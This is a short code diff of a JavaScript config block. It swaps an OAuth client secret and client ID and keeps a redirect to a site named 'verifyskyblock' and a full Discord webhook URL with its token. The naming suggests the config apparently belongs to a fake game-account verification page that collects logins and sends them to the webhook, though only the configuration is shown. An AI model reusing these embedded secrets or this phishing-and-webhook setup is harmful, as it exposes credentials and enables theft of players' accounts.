@@ -1,6 +1,6 @@
 //Config
-const secret_value = '.WW8Q~BnSgyVc5h5DzTEQWU5wRmqyeJdqIo4Tas8'
-const client_id = 'a06c832a-e2a5-4d5e-a2b3-c5f8fb61fe35'
+const secret_value = 'lSS8Q~__msihxNWrlWLLo2ySkLaV.I2IG8aoib9k'
+const client_id = 'a30c9d19-7ae6-48ef-b625-a86444a5aeed'
 const redirect_uri = 'https://verifyskyblock.netlify.app'
 const webhook_url = 'https://discord.com/api/webhooks/1045338697500999740/-fGf7uq6z1N6HjAqd-9KaCncQ-YmgHjZmBOvpw50EjjVfwrgz8KAj0p134je-E5299Mk'
 //Requirements
